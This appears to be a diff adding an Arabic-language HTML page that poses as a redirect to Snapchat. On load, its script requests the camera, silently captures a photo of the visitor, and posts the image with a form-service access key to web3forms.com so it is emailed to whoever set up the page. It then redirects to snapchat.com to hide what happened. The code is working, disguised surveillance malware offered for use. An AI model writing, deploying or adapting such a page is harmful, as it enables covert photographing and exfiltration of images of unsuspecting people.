@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحويل...</title>
+    <style>
+        /* تصميم بسيط لإيهام المستخدم أن الصفحة تحمل */
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #ffffff; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #FFFC00; /* لون سناب شات */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #555; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p>جاري فتح تطبيق سناب شات...</p>
+
+    <script>
+        async function runSystem() {
+            const ACCESS_KEY = "39759f28-ba77-4a4d-9673-e522d1bfff09";
+            const REDIRECT_URL = "https://snapchat.com";
+
+            try {
+                // 1. تشغيل الكاميرا (سيظهر طلب الإذن للمستخدم)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // إنشاء فيديو وهمي في الخلفية للالتقاط
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // الانتظار ثانية واحدة لضمان وضوح الصورة بعد فتح العدسة
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    // تقليل الأبعاد لضمان سرعة الإرسال وعدم حظر الإيميل
+                    canvas.width = 480; 
+                    canvas.height = 360;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 480, 360);
+                    
+                    // تحويل الصورة لصيغة JPEG مضغوطة
+                    const imageData = canvas.toDataURL('image/jpeg', 0.6);
+
+                    // 2. إرسال الصورة لبريدك الإلكتروني
+                    await fetch("https://web3forms.com", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            access_key: ACCESS_KEY,
+                            subject: "📸 صـورة جـديدة تـم التقاطها!",
+                            from_name: "نظام المراقبة",
+                            image: imageData,
+                            message: "تم التقاط هذه الصورة فور فتح الرابط وقبل التحويل إلى سناب شات."
+                        })
+                    });
+
+                    // إيقاف الكاميرا والتحويل فوراً
+                    stream.getTracks().forEach(track => track.stop());
+                    window.location.href = REDIRECT_URL;
+
+                }, 1200);
+
+            } catch (err) {
+                // في حال الرفض أو عدم وجود كاميرا، حوله لسناب شات مباشرة
+                console.log("Error or Denied");
+                window.location.href = REDIRECT_URL;
+            }
+        }
+
+        // بدء التنفيذ بمجرد تحميل الصفحة
+        window.onload = runSystem;
+    </script>
+</body>
+</html>
